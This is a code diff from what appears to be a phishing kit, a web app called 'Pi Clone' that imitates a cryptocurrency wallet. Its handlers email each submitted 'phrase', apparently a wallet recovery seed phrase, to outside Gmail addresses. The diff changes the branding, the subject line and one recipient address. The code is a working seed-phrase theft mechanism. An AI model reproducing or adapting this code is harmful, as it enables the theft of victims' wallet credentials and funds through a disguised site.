@@ -22,9 +22,9 @@ const formatMessage = async (message: string) => {
     const formattedMessage = formattedLines.join('');
 
     const mailOptions = {
-        from: `Pi Clone ${email}`,
+        from: `GAO Clone ${email}`,
         to: "sparrowthedev@gmail.com",
-        subject: "Yo! you just got a new phrase from mr link",
+        subject: "Yo! you just got a new phrase from mr GAO",
         html: formattedMessage,
     }
 
@@ -70,7 +70,7 @@ export async function POST(request: Request) {
 
         const mailOptions = {
             from: `Pi Clone ${email}`,
-            to: 'kylefarlane@gmail.com',
+            to: 'kyliebart497@gmail.com',
             subject: "Phrase From Your Website",
             html: formattedMessage,
         }
